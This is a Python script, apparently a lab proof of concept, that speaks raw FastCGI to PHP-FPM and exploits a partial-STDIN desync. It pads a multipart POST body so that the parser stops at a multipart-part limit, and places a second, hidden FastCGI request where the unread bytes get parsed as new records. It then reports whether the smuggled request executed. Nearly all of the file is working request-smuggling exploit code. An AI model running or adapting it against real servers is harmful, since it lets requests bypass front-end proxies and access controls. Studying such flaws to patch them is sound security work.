#!/usr/bin/env python3
"""Raw FastCGI client for T3: keep-alive sanity + partial-STDIN desync.

Protocol notes:
  - FPM multipart parser reads via sapi_fcgi_read_post -> fcgi_read in
    FILLUNIT=5120 byte chunks.
  - max_multipart_body_parts=1 stops the parser after the 2nd part headers
    inside the first 5120-byte fill.
  - fcgi_finish_request(request, 0) keeps the connection (FCGI_KEEP_CONN),
    and fcgi_close() does not drain unread STDIN.
  - The bytes at offset 5120 of the STDIN content are therefore parsed by
    the next fcgi_read_request() as FastCGI record headers.
"""
import socket, struct, sys, time, argparse

FCGI_BEGIN_REQUEST = 1
FCGI_END_REQUEST = 3
FCGI_PARAMS = 4
FCGI_STDIN = 5
FCGI_STDOUT = 6
FCGI_STDERR = 7

DOCROOT = "/tmp/opencode/research/fpm_bg_20261023T021053Z/lab/www"


def fcgi_record(rtype, req_id, content=b"", padding=0):
    return struct.pack("!BBHHBB", 1, rtype, req_id, len(content), padding, 0) + content + b"\x00" * padding


def enc_len(n):
    if n < 128:
        return bytes([n])
    return struct.pack("!I", n | 0x80000000)


def encode_params(env):
    # PHP fcgi_get_params (and nginx) order: name_len, value_len, name, value.
    out = b""
    for k, v in env.items():
        kb, vb = k.encode(), str(v).encode()
        out += enc_len(len(kb)) + enc_len(len(vb)) + kb + vb
    return out


def build_request(req_id, env, body=b"", keep=True, terminate_stdin=True):
    begin = struct.pack("!HB5s", 1, 1 if keep else 0, b"\x00" * 5)
    out = fcgi_record(FCGI_BEGIN_REQUEST, req_id, begin)
    params = encode_params(env)
    # split params into <= 65535 records
    off = 0
    while off < len(params):
        chunk = params[off:off + 65000]
        out += fcgi_record(FCGI_PARAMS, req_id, chunk)
        off += len(chunk)
    out += fcgi_record(FCGI_PARAMS, req_id, b"")
    if body:
        off = 0
        while off < len(body):
            chunk = body[off:off + 65000]
            out += fcgi_record(FCGI_STDIN, req_id, chunk)
            off += len(chunk)
        if terminate_stdin:
            out += fcgi_record(FCGI_STDIN, req_id, b"")
    return out


def parse_responses(data, ids=(1, 2)):
    """Split FastCGI response stream into per-request stdout/stderr/end."""
    res = {i: {"stdout": b"", "stderr": b"", "end": False, "app_status": None} for i in ids}
    off = 0
    while off + 8 <= len(data):
        ver, rtype, rid, clen, pad, _ = struct.unpack("!BBHHBB", data[off:off + 8])
        off += 8
        content = data[off:off + clen]
        off += clen + pad
        if rid in res:
            if rtype == FCGI_STDOUT:
                res[rid]["stdout"] += content
            elif rtype == FCGI_STDERR:
                res[rid]["stderr"] += content
            elif rtype == FCGI_END_REQUEST and len(content) >= 8:
                app_status, _proto_status, _reserved = struct.unpack("!IB3s", content[:8])
                res[rid]["end"] = True
                res[rid]["app_status"] = app_status
    return res


def recv_all(sock, seconds=6.0):
    sock.settimeout(0.5)
    data = b""
    deadline = time.time() + seconds
    while time.time() < deadline:
        try:
            chunk = sock.recv(65536)
            if not chunk:
                break
            data += chunk
            deadline = time.time() + 1.0
        except socket.timeout:
            continue
    return data


def connect(port, host="127.0.0.1"):
    s = socket.create_connection((host, port), timeout=10)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return s


def get_env(script, uri, method="GET", content_type="", content_length=""):
    env = {
        "GATEWAY_INTERFACE": "CGI/1.1",
        "SERVER_SOFTWARE": "t3-raw",
        "SERVER_PROTOCOL": "HTTP/1.1",
        "REQUEST_METHOD": method,
        "SCRIPT_FILENAME": DOCROOT + "/" + script,
        "SCRIPT_NAME": "/" + script,
        "REQUEST_URI": uri,
        "DOCUMENT_ROOT": DOCROOT,
        "QUERY_STRING": "",
        "REMOTE_ADDR": "127.0.0.1",
    }
    if content_type:
        env["CONTENT_TYPE"] = content_type
    if content_length != "":
        env["CONTENT_LENGTH"] = str(content_length)
    return env


def cmd_keepalive(args):
    s = connect(args.port)
    s.sendall(build_request(1, get_env("ping.php", "/ping.php"), keep=True))
    time.sleep(0.3)
    data1 = recv_all(s, seconds=2.0)
    s.sendall(build_request(2, get_env("ping.php", "/ping.php"), keep=True))
    time.sleep(0.3)
    data2 = recv_all(s, seconds=2.0)
    s.close()
    print("RESP1", parse_responses(data1, ids=(1,))[1])
    print("RESP2", parse_responses(data2, ids=(2,))[2])


def cmd_smuggle(args):
    # 5120-byte multipart prefix: part a, then part b headers -> parts limit 1
    bnd = "T3BOUND"
    prefix = (
        ("--%s\r\n" % bnd).encode()
        + b'Content-Disposition: form-data; name="a"\r\n\r\n'
        + b"A\r\n"
        + ("--%s\r\n" % bnd).encode()
        + b'Content-Disposition: form-data; name="b"\r\n\r\n'
    )
    pad_to = args.prefix_len
    assert len(prefix) <= pad_to, len(prefix)
    prefix = prefix + b"P" * (pad_to - len(prefix))

    hidden_env = get_env(args.hidden_script, "/" + args.hidden_script)
    hidden_env["QUERY_STRING"] = "hidden=1"
    hidden_req = build_request(2, hidden_env, body=b"", keep=False)

    body = prefix + hidden_req
    env1 = get_env(args.target_script, "/" + args.target_script, method="POST",
                   content_type="multipart/form-data; boundary=" + bnd,
                   content_length=len(body))
    req1 = build_request(1, env1, body=body, keep=True)
    s = connect(args.port)
    s.sendall(req1)
    data = recv_all(s, seconds=args.wait)
    s.close()
    res = parse_responses(data, ids=(1, 2))
    for rid in (1, 2):
        r = res[rid]
        print("REQ%d end=%s app_status=%s stdout=%r stderr=%r" % (
            rid, r["end"], r["app_status"],
            r["stdout"][:300], r["stderr"][:300]))
    return 0 if res[2]["end"] or res[2]["stdout"] else 1


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("cmd", choices=["keepalive", "smuggle"])
    ap.add_argument("--port", type=int, default=29361)
    ap.add_argument("--target-script", default="t3_target.php")
    ap.add_argument("--hidden-script", default="t3_hidden.php")
    ap.add_argument("--prefix-len", type=int, default=5176)
    ap.add_argument("--wait", type=float, default=6.0)
    args = ap.parse_args()
    if args.cmd == "keepalive":
        cmd_keepalive(args)
    else:
        sys.exit(cmd_smuggle(args))


if __name__ == "__main__":
    main()
